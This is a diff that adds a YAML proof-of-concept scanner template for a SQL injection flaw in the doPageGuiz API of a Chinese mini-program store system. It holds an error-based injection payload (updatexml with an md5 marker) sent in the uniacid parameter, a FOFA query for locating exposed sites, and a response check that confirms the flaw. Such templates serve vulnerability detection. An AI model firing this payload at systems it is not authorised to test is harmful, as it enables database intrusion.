@@ -1,0 +1,20 @@
+id: poc-yaml-internet-wxapps-dopageguiz-sqli
+info:
+  name: 万能门店小程序系统 doPageGuiz SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全行业小程序运营系统
+  fofa: body="/comhome/cases/index.html"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/wxapps/doPageGuiz
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: suid=1&uniacid=1 and updatexml(1,concat(0x7e,(select md5('{{.t1}}')),0x7e),1)--+
+  expression: status_code == 200 && contains(body,"SQLSTATE[HY000]") && contains(body,"XPATH
+    syntax error") && !contains(body,"<") && contains(body,substr(t2,0,31))
+transport: http
